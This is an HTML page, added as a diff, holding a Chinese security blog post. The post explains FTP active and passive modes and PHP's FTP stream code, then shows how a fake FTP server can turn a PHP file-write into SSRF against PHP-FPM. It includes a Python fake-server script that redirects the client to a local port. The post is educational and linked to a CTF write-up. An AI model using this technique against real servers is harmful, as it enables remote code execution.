@@ -1,0 +1,523 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/css/images/bg/favicon.ico">
+  <link rel="icon" type="image/png" href="/css/images/bg/favicon.ico">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="摸鱼">
+  <meta name="author" content="Aluvion">
+  <meta name="keywords" content="">
+  <title>从FTP到PHP-FPM - Twings</title>
+
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/font-awesome/5.12.1/css/all.min.css" />
+<link  rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css" />
+<link  rel="stylesheet" href="https://cdn.staticfile.org/mdbootstrap/4.13.0/css/mdb.min.css" />
+<link  rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/3.0.1/github-markdown.min.css" />
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1067060_qzomjdt8bmp.css">
+
+
+
+  <link  rel="stylesheet" href="/lib/prettify/tomorrow-night-eighties.min.css" />
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link defer rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+<!-- 自定义样式保持在最底部 -->
+
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>Twings</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/">首页</a>
+          </li>
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/archives/">归档</a>
+          </li>
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/tags/">标签</a>
+          </li>
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/about/">关于</a>
+          </li>
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/links/">友链</a>
+          </li>
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="view intro-2" id="background" parallax=true
+         style="background: url('/css/images/bg/bg5.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask rgba-black-light flex-center">
+          <div class="container text-center white-text fadeInUp">
+            <span class="h2" id="subtitle">
+              
+            </span>
+
+            
+              
+                <p class="mt-3 post-meta">
+                  <i class="fas fa-calendar-alt" aria-hidden="true"></i>
+                  星期二, 三月 2日 2021, 10:43 晚上
+                </p>
+              
+
+              <p class="mt-1">
+                
+                  
+                  <span class="post-meta">
+                    <i class="far fa-chart-bar"></i>
+                    1.8k 字
+                  </span>
+                
+
+                
+                  
+                  <span class="post-meta">
+                      <i class="far fa-clock"></i>
+                      7 分钟
+                  </span>
+                
+
+                
+                  <!-- 不蒜子统计文章PV -->
+                  
+                  <span id="busuanzi_container_page_pv" class="post-meta" style="display: none">
+                    <i class="far fa-eye" aria-hidden="true"></i>
+                    <span id="busuanzi_value_page_pv"></span> 次
+                  </span>
+                
+              </p>
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid">
+  <div class="row">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-md">
+      <div class="container nopadding-md" id="board-ctn">
+        <div class="py-5 z-depth-3" id="board">
+          <div class="post-content mx-auto" id="post">
+            
+            <div class="markdown-body">
+              <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p> 猛的，有趣的。</p>
+<span id="more"></span>
+
+<hr>
+<h3 id="FTP"><a href="#FTP" class="headerlink" title="FTP"></a>FTP</h3><p>文件传输协议，其中服务端用于存储文件，客户端可以通过该协议访问服务端上的资源，可以进行文件上传和文件下载操作。</p>
+<p>FTP的工作模式有两种，其中一种为主动（Port）模式，在该模式下，客户端首先连接服务端的21端口，完成认证后自身打开并监听一个端口，再将端口号告知服务端，最后由服务端连接客户端的该端口并传输文件。因为主动模式下需要由服务端主动连接客户端，所以会因为客户端的防火墙等措施出现阻塞的情况。</p>
+<p>另一种为被动（Passive）模式，在该模式下，客户端同样首先连接服务端的21端口，此时客户端会提交一个PASV命令，代表进入被动模式，然后服务端监听一个端口，再将端口号告知客户端，由客户端连接服务端的该端口进行文件传输。</p>
+<p>而由于主动模式存在各种隐患，FTP客户端一般选择使用被动模式进行交互。</p>
+<p>用docker搭建一个FTP服务（使用的镜像为fauria&#x2F;vsftpd），然后简单用FTP客户端上传一个文件，抓个包看看：</p>
+<p><img src="/css/images/ftp_ssrf/2021030201.png" srcset="/img/loading.gif"></p>
+<p>可以看出，客户端完成认证之后，将传输模式设置为Binary，然后发送了一条PORT命令，将自身监听的端口以149,83的形式告知服务端。服务端计算149*256+83&#x3D;38227得出端口，用自身的20端口和客户端的该端口建立连接后，客户端就将文件内容传输至服务端，并保存在指定目录下。</p>
+<p>观察流量包可以发现，在客户端发送完PORT命令后，服务端的相应为：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Response: 200 PORT command successful. Consider using PASV.</span><br></pre></td></tr></table></figure>
+
+<p>结合流量包交互流程，我们可以发现，此次文件传输使用的是FTP的主动模式。</p>
+<p>观察文件传输数据包：</p>
+<p><img src="/css/images/ftp_ssrf/2021030202.png" srcset="/img/loading.gif"></p>
+<p>可以发现，20和38227端口之间的数据交互内容就是上传的文件内容。</p>
+<p>接下来尝试使用被动模式，使用PASV命令进入被动模式并抓包：</p>
+<p><img src="/css/images/ftp_ssrf/2021030203.png" srcset="/img/loading.gif"></p>
+<p>大致的流程相同，只不过开启端口的是服务端，开启的端口也由服务端告知客户端。除此之外，文件传输使用的是一个TCP包，文件内容被放置在TCP包的数据部分。</p>
+<p>很明显，在一次客户端通过FTP协议上传文件的过程中，如果我们可以控制其上传文件的目的地，以及上传文件内容，我们就可以通过伪造FTP服务端的方式，让客户端向一个特定地方发送一个可控的TCP包，实现一次自由度相当高的SSRF攻击。</p>
+<h3 id="PHP-FPM"><a href="#PHP-FPM" class="headerlink" title="PHP-FPM"></a>PHP-FPM</h3><p>我们都知道，当PHP运行在FPM模式下时，一次请求是由Nginx作为代理，通过FastCGI协议与PHP进行交互来实现的。此时PHP就是一个独立的服务，可以通过SSRF的方式进行访问，满足条件时甚至可以实现RCE。</p>
+<p>而PHP中的file_put_contents函数，<a href="https://www.php.net/manual/zh/function.file-put-contents.php">底层支持FTP协议</a>，所以在PHP运行在FPM模式的情况下，可以将一个文件写漏洞转换为一个RCE漏洞（前提是写文件路径可控，且内容完全可控）。</p>
+<p>先来看看PHP的file_put_contents函数对FTP协议的实现，找到ftp_fopen_wrapper.c里的php_stream_url_wrap_ftp函数：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">stream = php_ftp_fopen_connect(wrapper, path, mode, options, opened_path, context, &amp;reuseid, &amp;resource, &amp;use_ssl, &amp;use_ssl_on_data);</span><br><span class="line"><span class="keyword">if</span> (!stream) &#123;</span><br><span class="line">    <span class="keyword">goto</span> errexit;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>进入php_ftp_fopen_connect函数开始连接服务端：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Start talking to ftp server */</span></span><br><span class="line">result = GET_FTP_RESULT(stream);</span><br><span class="line"><span class="keyword">if</span> (result &gt; <span class="number">299</span> || result &lt; <span class="number">200</span>) &#123;</span><br><span class="line">    php_stream_notify_error(context, PHP_STREAM_NOTIFY_FAILURE, tmp_line, result);</span><br><span class="line">    <span class="keyword">goto</span> connect_errexit;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>开始建立连接，要求第一个响应码在200-299之间，相当于一个Hello招呼，也就是流量包里的：</p>
+<p><img src="/css/images/ftp_ssrf/2021030204.png" srcset="/img/loading.gif"></p>
+<p>继续看代码：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* send the user name */</span></span><br><span class="line"><span class="keyword">if</span> (resource-&gt;user != <span class="literal">NULL</span>) &#123;</span><br><span class="line">    ZSTR_LEN(resource-&gt;user) = php_raw_url_decode(ZSTR_VAL(resource-&gt;user), ZSTR_LEN(resource-&gt;user));</span><br><span class="line"></span><br><span class="line">    PHP_FTP_CNTRL_CHK(ZSTR_VAL(resource-&gt;user), ZSTR_LEN(resource-&gt;user), <span class="string">&quot;Invalid login %s&quot;</span>)</span><br><span class="line"></span><br><span class="line">        php_stream_printf(stream, <span class="string">&quot;USER %s\r\n&quot;</span>, ZSTR_VAL(resource-&gt;user));</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    php_stream_write_string(stream, <span class="string">&quot;USER anonymous\r\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>开始验证登录，首先客户端发送用户名，也就是流量包里的：</p>
+<p><img src="/css/images/ftp_ssrf/2021030205.png" srcset="/img/loading.gif"></p>
+<p>然后：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* if a password is required, send it */</span></span><br><span class="line"><span class="keyword">if</span> (result &gt;= <span class="number">300</span> &amp;&amp; result &lt;= <span class="number">399</span>) &#123;</span><br><span class="line">    php_stream_notify_info(context, PHP_STREAM_NOTIFY_AUTH_REQUIRED, tmp_line, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (resource-&gt;pass != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        ZSTR_LEN(resource-&gt;pass) = php_raw_url_decode(ZSTR_VAL(resource-&gt;pass), ZSTR_LEN(resource-&gt;pass));</span><br><span class="line"></span><br><span class="line">        PHP_FTP_CNTRL_CHK(ZSTR_VAL(resource-&gt;pass), ZSTR_LEN(resource-&gt;pass), <span class="string">&quot;Invalid password %s&quot;</span>)</span><br><span class="line"></span><br><span class="line">            php_stream_printf(stream, <span class="string">&quot;PASS %s\r\n&quot;</span>, ZSTR_VAL(resource-&gt;pass));</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">/* if the user has configured who they are,</span></span><br><span class="line"><span class="comment">			   send that as the password */</span></span><br><span class="line">        <span class="keyword">if</span> (FG(from_address)) &#123;</span><br><span class="line">            php_stream_printf(stream, <span class="string">&quot;PASS %s\r\n&quot;</span>, FG(from_address));</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            php_stream_write_string(stream, <span class="string">&quot;PASS anonymous\r\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* read the response */</span></span><br><span class="line">    result = GET_FTP_RESULT(stream);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (result &gt; <span class="number">299</span> || result &lt; <span class="number">200</span>) &#123;</span><br><span class="line">        php_stream_notify_error(context, PHP_STREAM_NOTIFY_AUTH_RESULT, tmp_line, result);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        php_stream_notify_info(context, PHP_STREAM_NOTIFY_AUTH_RESULT, tmp_line, result);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (result &gt; <span class="number">299</span> || result &lt; <span class="number">200</span>) &#123;</span><br><span class="line">    <span class="keyword">goto</span> connect_errexit;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>然后根据响应确定是否需要输入密码，当响应码为300-399时代表需要输入密码（其后响应码为200-299代表密码正确），200-299代表不需要，也就是流量包中的：</p>
+<p><img src="/css/images/ftp_ssrf/2021030206.png" srcset="/img/loading.gif"></p>
+<p>这样连接部分就完成了，访问上一个函数：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* set the connection to be binary */</span></span><br><span class="line">php_stream_write_string(stream, <span class="string">&quot;TYPE I\r\n&quot;</span>);</span><br><span class="line">result = GET_FTP_RESULT(stream);</span><br><span class="line"><span class="keyword">if</span> (result &gt; <span class="number">299</span> || result &lt; <span class="number">200</span>)</span><br><span class="line">    <span class="keyword">goto</span> errexit;</span><br><span class="line">...</span><br><span class="line"><span class="comment">/* set up the passive connection */</span></span><br><span class="line">portno = php_fopen_do_pasv(stream, ip, <span class="keyword">sizeof</span>(ip), &amp;hoststart);</span><br></pre></td></tr></table></figure>
+
+<p>将传输模式设置为Binary，然后进入php_fopen_do_pasv函数：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* EPSV failed, let&#x27;s try PASV */</span></span><br><span class="line">php_stream_write_string(stream, <span class="string">&quot;PASV\r\n&quot;</span>);</span><br><span class="line">result = GET_FTP_RESULT(stream);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* make sure we got a 227 response */</span></span><br><span class="line"><span class="keyword">if</span> (result != <span class="number">227</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>将模式切换为被动模式，并确保切换成功，也就是流量包中的：</p>
+<p><img src="/css/images/ftp_ssrf/2021030207.png" srcset="/img/loading.gif"></p>
+<p>之后就是解析并计算出被动模式下服务端的地址以及监听的端口，并发送文件内容了。</p>
+<p>接下来试试让客户端将命令发送给本地的2333端口，先起一个docker：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -<span class="built_in">id</span> --name ftp -e FTP_PASS=admin -e PASV_ADDRESS=127.0.0.1 -e PASV_MIN_PORT=2333 -e PASV_MAX_PORT=2333 fauria/vsftpd</span><br></pre></td></tr></table></figure>
+
+<p>然后将FTP切换为被动模式并上传文件，可以看到：</p>
+<p><img src="/css/images/ftp_ssrf/2021030208.png" srcset="/img/loading.gif"></p>
+<p>虽然客户端连接上了本地的2333端口，但是由于服务端没有告知客户端可以发送文件了，所以流程卡住了，也就是流量包中的这部分没有完成：</p>
+<p><img src="/css/images/ftp_ssrf/2021030209.png" srcset="/img/loading.gif"></p>
+<p>所以要实现一次攻击，还需要自己实现一个伪造的FTP服务端，详见参考文章，脚本如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">host = <span class="string">&#x27;0.0.0.0&#x27;</span></span><br><span class="line">port = <span class="number">23</span></span><br><span class="line">sk = socket.socket()</span><br><span class="line">sk.bind((host, port))</span><br><span class="line">sk.listen(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">conn, address = sk.accept()</span><br><span class="line">conn.send(<span class="string">&quot;200 \n&quot;</span>)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;200&#x27;</span></span><br><span class="line"><span class="built_in">print</span> conn.recv(<span class="number">20</span>)</span><br><span class="line"></span><br><span class="line">conn.send(<span class="string">&quot;200 \n&quot;</span>)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;200&#x27;</span></span><br><span class="line"><span class="built_in">print</span> conn.recv(<span class="number">20</span>)</span><br><span class="line"></span><br><span class="line">conn.send(<span class="string">&quot;200 \n&quot;</span>)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;200&#x27;</span></span><br><span class="line"><span class="built_in">print</span> conn.recv(<span class="number">20</span>)</span><br><span class="line"></span><br><span class="line">conn.send(<span class="string">&quot;300 \n&quot;</span>)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;300&#x27;</span></span><br><span class="line"><span class="built_in">print</span> conn.recv(<span class="number">20</span>)</span><br><span class="line"></span><br><span class="line">conn.send(<span class="string">&quot;200 \n&quot;</span>)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;200&#x27;</span></span><br><span class="line"><span class="built_in">print</span> conn.recv(<span class="number">20</span>)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;ck&quot;</span></span><br><span class="line">conn.send(<span class="string">&quot;227 127,0,0,1,8,6952\n&quot;</span>)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;200&#x27;</span></span><br><span class="line"><span class="built_in">print</span> conn.recv(<span class="number">20</span>)</span><br><span class="line"></span><br><span class="line">conn.send(<span class="string">&quot;150 \n&quot;</span>)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;150&#x27;</span></span><br><span class="line"><span class="built_in">print</span> conn.recv(<span class="number">20</span>)</span><br><span class="line">conn.close()</span><br><span class="line">exit()</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><p><a href="https://www.cnblogs.com/liyong-blackStone/p/10309749.html">FTP协议简介</a></p>
+<p><a href="https://www.anquanke.com/post/id/226750">hxp2020的resonator题解分析</a></p>
+
+            </div>
+            <hr>
+            <div>
+              <p>
+                
+                
+                  <span>
+                <i class="iconfont icon-tag"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/Web/">Web</a>
+                    
+                      <a class="hover-with-bg" href="/tags/PHPFPM/">PHPFPM</a>
+                    
+                      <a class="hover-with-bg" href="/tags/FastCGI/">FastCGI</a>
+                    
+                      <a class="hover-with-bg" href="/tags/PHP/">PHP</a>
+                    
+                  </span>
+                
+              </p>
+              
+                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a href="https://zh.wikipedia.org/wiki/Wikipedia:CC_BY-SA_3.0%E5%8D%8F%E8%AE%AE%E6%96%87%E6%9C%AC" rel="nofollow noopener">CC BY-SA 3.0协议</a> 。转载请注明出处！</p>
+              
+              
+                <div class="post-prevnext row">
+                  <div class="post-prev col-12 col-md-6">
+                    
+                      <a href="/2021/03/16/Chrome%E6%B5%8F%E8%A7%88%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%85%A5%E9%97%A8/">
+                        <i class="fa fa-chevron-left"></i>
+                        <span>Chrome浏览器漏洞入门</span>
+                      </a>
+                    
+                  </div>
+                  <div class="post-next col-12 col-md-6">
+                    
+                      <a href="/2021/02/19/php-filter%E8%BF%87%E6%BB%A4%E5%99%A8%E7%9A%84%E5%A5%87%E5%A6%99%E6%93%8D%E4%BD%9C/">
+                        <span>php://filter过滤器的奇妙操作</span>
+                        <i class="fa fa-chevron-right"></i>
+                      </a>
+                    
+                  </div>
+                </div>
+              
+            </div>
+
+              
+          </div>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc-start"></div>
+<div id="toc">
+  <p class="h5"><i class="far fa-list-alt"></i>&nbsp;目录</p>
+  <div id="tocbot"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+  </main>
+
+  
+    <a class="z-depth-1" id="scroll-top-button" href="#" role="button">
+      <i class="fa fa-chevron-up scroll-top-arrow" aria-hidden="true"></i>
+    </a>
+  
+
+  
+    <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+  
+
+  
+
+  
+
+  <footer class="mt-5">
+  <div class="text-center py-3">
+    <div>
+      <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><b>Hexo</b></a>
+      <i class="iconfont icon-love"></i>
+      <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"> <b>Fluid</b></a>
+    </div>
+    
+
+    
+
+    
+  </div>
+</footer>
+
+<!-- SCRIPTS -->
+<script  src="https://cdn.staticfile.org/jquery/3.4.1/jquery.min.js" ></script>
+<script  src="https://cdn.staticfile.org/popper.js/1.16.1/umd/popper.min.js" ></script>
+<script  src="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/js/bootstrap.min.js" ></script>
+<script  src="https://cdn.staticfile.org/mdbootstrap/4.13.0/js/mdb.min.js" ></script>
+<script  src="/js/main.js" ></script>
+
+
+  <script  src="/js/lazyload.js" ></script>
+
+
+
+  
+  <script  src="https://cdn.staticfile.org/tocbot/4.10.0/tocbot.min.js" ></script>
+  <script>
+    $(document).ready(function () {
+      var navHeight = $('#navbar').height();
+      var toc = $('#toc');
+      var boardCtn = $('#board-ctn');
+      var boardTop = boardCtn.offset().top;
+      var tocLimMax = 2 * boardTop + boardCtn.height();
+
+      $(window).scroll(function () {
+        var tocLimMin = $('#toc-start').offset().top - navHeight;
+        var scroH = document.body.scrollTop + document.documentElement.scrollTop;
+
+        if (tocLimMin <= scroH && scroH <= tocLimMax) {
+          toc.css({
+            'display': 'block',
+            'position': 'fixed',
+            'top': navHeight,
+          });
+        } else if (scroH <= tocLimMin) {
+          toc.css({
+            'position': '',
+            'top': '',
+          });
+        } else if (scroH > tocLimMax) {
+          toc.css('display', 'none');
+        }
+      });
+      tocbot.init({
+        tocSelector: '#tocbot',
+        contentSelector: '.post-content',
+        headingSelector: 'h1,h2,h3,h4,h5,h6',
+        linkClass: 'tocbot-link',
+        activeLinkClass: 'tocbot-active-link',
+        listClass: 'tocbot-list',
+        isCollapsedClass: 'tocbot-is-collapsed',
+        collapsibleClass: 'tocbot-is-collapsible',
+        scrollSmooth: true,
+        headingsOffset: -boardTop
+      });
+      if ($('.toc-list-item').length > 0) {
+        $('#toc > p').css('visibility', 'visible');
+      }
+      var offset = boardCtn.css('margin-right')
+      $('#toc-ctn').css({
+        'right': offset
+      })
+    });
+  </script>
+
+
+
+
+
+
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+<!-- Plugins -->
+
+
+
+  <script  src="https://cdn.staticfile.org/prettify/188.0.0/prettify.min.js" ></script>
+  <script>
+    $(document).ready(function () {
+      $('pre').addClass('prettyprint  linenums');
+      prettyPrint();
+    })
+  </script>
+
+
+
+  <script  src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js" ></script>
+  <script>
+    var typed = new Typed('#subtitle', {
+      strings: [
+        '  ',
+        "从FTP到PHP-FPM&nbsp;",
+      ],
+      cursorChar: "_",
+      typeSpeed: 70,
+      loop: false,
+    });
+    typed.stop();
+    $(document).ready(function () {
+      $(".typed-cursor").addClass("h2");
+      typed.start();
+    });
+  </script>
+
+
+
+  <script  src="https://cdn.staticfile.org/anchor-js/4.2.2/anchor.min.js" ></script>
+  <script>
+    anchors.options = {
+      placement: "right",
+      visible: "hover",
+      
+    };
+    var el = "h1,h2,h3,h4,h5,h6".split(",");
+    var res = [];
+    for (item of el) {
+      res.push(".markdown-body > " + item)
+    }
+    anchors.add(res.join(", "))
+  </script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+  <script>
+    var path = "/local-search.xml";
+    var inputArea = document.querySelector("#local-search-input");
+    inputArea.onclick = function () {
+      getSearchFile(path);
+      this.onclick = null
+    }
+  </script>
+
+
+
+  <script defer src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js" ></script>
+  <script>
+    $("#post img:not(.no-zoom img, img[no-zoom])").each(
+      function () {
+        var element = document.createElement("a");
+        $(element).attr("data-fancybox", "images");
+        $(element).attr("href", $(this).attr("src"));
+        $(this).wrap(element);
+      }
+    );
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+</body>
+</html>
